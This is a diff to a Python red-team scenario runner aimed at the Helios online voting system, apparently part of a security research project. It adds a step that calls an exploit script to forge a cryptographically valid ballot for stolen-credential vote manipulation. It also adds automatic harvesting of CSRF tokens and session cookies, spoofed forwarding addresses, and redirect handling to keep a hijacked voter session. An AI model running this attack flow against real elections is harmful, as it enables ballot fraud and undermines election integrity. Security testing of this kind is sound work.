@@ -18,6 +18,7 @@ import sys
 import time
 import itertools
 import logging
+import subprocess
 import requests
 from datetime import datetime
 from pathlib import Path
@@ -63,6 +64,39 @@ _scenario_ip_counter = itertools.count(11)
 
 def _next_scenario_ip() -> str:
     return os.environ.get("REDTEAM_XFF") or f"198.51.100.{next(_scenario_ip_counter) % 250 + 1}"
+
+
+# ─── B-full: valid-ballot bridge (stolen-credential vote manipulation, §5.8) ──
+# A BUILD_BALLOT step crafts a cryptographically valid Helios ballot by invoking
+# exploits/build_valid_ballot.py under the HELIOS venv (it needs Django + helios
+# models, which the DIS venv does not have). The ballot JSON is stored in context
+# so a subsequent POST /cast can submit it as {encrypted_vote}.
+HELIOS_HOME = os.path.expanduser(os.environ.get("HELIOS_HOME", "~/helios-server"))
+HELIOS_PY   = os.environ.get("HELIOS_PY", os.path.join(HELIOS_HOME, ".venv/bin/python"))
+_BALLOT_BUILDER = str(PROJECT_ROOT / "exploits" / "build_valid_ballot.py")
+
+
+def build_valid_ballot(election_uuid: str, choice: int = 0, question: int = 0) -> Optional[str]:
+    """Return a verified ballot JSON string, or None if the bridge is unavailable
+    (e.g. HELIOS venv/checkout missing) so the scenario degrades gracefully."""
+    if not (os.path.exists(HELIOS_PY) and os.path.exists(_BALLOT_BUILDER)):
+        logging.warning("build_valid_ballot: HELIOS_PY or builder missing (%s) — "
+                        "skipping (set HELIOS_HOME/HELIOS_PY)", HELIOS_PY)
+        return None
+    try:
+        env = dict(os.environ, HELIOS_HOME=HELIOS_HOME)
+        out = subprocess.run(
+            [HELIOS_PY, _BALLOT_BUILDER, "--uuid", election_uuid,
+             "--choice", str(choice), "--question", str(question)],
+            capture_output=True, text=True, timeout=60, env=env)
+        if out.returncode != 0 or not out.stdout.strip():
+            logging.warning("build_valid_ballot failed (rc=%s): %s",
+                            out.returncode, out.stderr.strip()[-300:])
+            return None
+        return out.stdout.strip()
+    except (subprocess.SubprocessError, OSError) as e:
+        logging.warning("build_valid_ballot subprocess error: %s", e)
+        return None
 
 # Neutralize leftover LLM context-placeholders like "<from step1>" / "<csrftoken step3>"
 # (unresolved cross-step references the generator emitted) so they do not leak into the
@@ -128,8 +162,10 @@ def extract_from_response(resp: requests.Response, extract_spec: dict, context: 
     Extract values from the response according to the context_extract spec.
     Supports: json_key, regex, cookie_name, header_name.
     """
-    if not extract_spec:
-        return {}
+    # NOTE: do NOT early-return on an empty extract_spec — the automatic token
+    # extraction below (csrfmiddlewaretoken, Helios csrf_token, sessionid) must run
+    # on every response so later steps have the tokens even without an explicit spec.
+    extract_spec = extract_spec or {}
 
     extracted = {}
     text = resp.text
@@ -213,12 +249,20 @@ def extract_from_response(resp: requests.Response, extract_spec: dict, context: 
             extracted[key] = val
             context[key] = val
 
-    # Automatic: CSRF token
+    # Automatic: Django CSRF token (csrfmiddlewaretoken)
     if "csrf_token" not in context:
         m = re.search(r'csrfmiddlewaretoken["\s]+value=["\']([^"\']+)', text)
         if m:
             context["csrf_token"] = m.group(1)
             extracted["csrf_token"] = m.group(1)
+
+    # Automatic: Helios' OWN custom CSRF field (name="csrf_token"), distinct from
+    # Django's csrfmiddlewaretoken. cast_confirm's check_csrf() compares POST
+    # 'csrf_token' to session['csrf_token'] — sending the Django one raises 500.
+    m2 = re.search(r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)', text)
+    if m2:
+        context["helios_csrf"] = m2.group(1)
+        extracted["helios_csrf"] = m2.group(1)
 
     # Automatic: sessionid
     sid = resp.cookies.get("sessionid")
@@ -353,6 +397,27 @@ def execute_step(session: requests.Session, step: dict, context: dict) -> dict:
         "error": None,
     }
 
+    # BUILD_BALLOT: craft a cryptographically valid ballot (no HTTP) and stash it in
+    # context for a later POST /cast. This is the crux of the B-full stolen-credential
+    # experiment — see build_valid_ballot() / exploits/build_valid_ballot.py.
+    if method == "BUILD_BALLOT":
+        store_as = step.get("store_as", "encrypted_vote")
+        choice = int(step.get("choice", 0))
+        question = int(step.get("question", 0))
+        ballot = build_valid_ballot(context.get("election_uuid", ELECTION_UUID),
+                                    choice=choice, question=question)
+        extracted = {}
+        if ballot:
+            context[store_as] = ballot
+            extracted[store_as] = f"<valid ballot {len(ballot)}B, choice={choice}>"
+            result["success"], result["success_reason"] = True, "valid ballot crafted"
+            result["response_preview"] = f"[BUILD_BALLOT] {len(ballot)}B verified ballot"
+        else:
+            result["success"], result["success_reason"] = False, "ballot bridge unavailable"
+            result["response_preview"] = "[BUILD_BALLOT] bridge unavailable (HELIOS venv?)"
+        result["extracted"] = extracted
+        return result
+
     # LOCAL / NETWORK steps do not make HTTP requests
     if method in ("LOCAL", "NETWORK") or not endpoint:
         extracted = {}
@@ -372,17 +437,25 @@ def execute_step(session: requests.Session, step: dict, context: dict) -> dict:
         if context.get("csrf_token"):
             headers["X-CSRFToken"] = context["csrf_token"]
 
+        # Per-step redirect control. Helios' election-scoped password_voter_login
+        # sets the voter session on the 302 response, then redirects to SECURE_URL_HOST
+        # (:8000). Following that in a baseline run (proxy down / different host) would
+        # error out the step even though the auth cookie is already set. A login step
+        # sets "follow_redirects": false to keep the session and skip the bounce.
+        follow = step.get("follow_redirects", True)
+
         if method == "GET":
-            resp = session.get(url, timeout=HTTP_TIMEOUT, allow_redirects=True)
+            resp = session.get(url, timeout=HTTP_TIMEOUT, allow_redirects=follow)
         elif method == "POST":
             # Add CSRF to the form data if present
             if context.get("csrf_token") and "csrfmiddlewaretoken" not in payload:
                 payload["csrfmiddlewaretoken"] = context["csrf_token"]
             resp = session.post(url, data=payload, timeout=HTTP_TIMEOUT,
-                                allow_redirects=True, headers=headers)
+                                allow_redirects=follow, headers=headers)
         else:
             resp = session.request(method, url, data=payload,
-                                   timeout=HTTP_TIMEOUT, headers=headers)
+                                   timeout=HTTP_TIMEOUT, headers=headers,
+                                   allow_redirects=follow)
 
         result["status_code"] = resp.status_code
         result["response_length"] = len(resp.text)
